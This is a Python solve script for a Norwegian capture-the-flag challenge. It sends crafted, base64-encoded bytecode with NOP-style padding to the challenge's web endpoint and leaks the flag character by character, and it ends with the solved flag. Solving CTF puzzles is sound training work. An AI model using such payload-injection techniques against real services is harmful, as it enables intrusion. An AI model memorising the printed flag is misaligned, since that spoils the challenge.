import base64
import codecs
import requests
from tqdm import tqdm

# https://pingvin.spst.no/.netlify/functions/count?input=8WgWD%2BFwVeBMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExcXPIBFvA%3D
'''
Sett 0xb4 og 0xb5 til \00:
(xeller med 4c)

sett r14, 4c    => e14c

sett r0, b4     => 01b4

last r3         => 0403
xeller r3, r14  => 25e3
lagr r3         => 1403
r0 +1 =>        => 55b0
last r3         => 0403
xeller r3, r14  => 25e3
lagr r3         => 1403

lag stopp:
e14c 01b4 0403 25e3 1403 55b0 0403 25e3 
1403 

hent flagg:
sett r0,06      => 0106
last r2         => 0402
skrive r2,      => 1602

0106 0402 1602'''

base_url = 'https://pingvin.spst.no/.netlify/functions/count?input='

del1 = '4ce14c01b4040325e3140301B5040325e314034c4c4c4c4c4c4c4c4c4c4c4c01'.encode()
del2  =  '040216024c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c4c5c5c6803'.encode()

for i in tqdm(range(6,40), desc="leaking flag characters"):
    bytestring = del1 + "{:02X}".format(i).encode() + del2
    unhexed = codecs.decode(bytestring, "hex")
    thing = base64.b64encode(unhexed)
    
    r = requests.get(url = base_url + thing.decode())
    data = r.json() 
    print(chr(data['svar'][0]),end="")

print('')

# PST{EveryoneAboardTheNOPESlede8}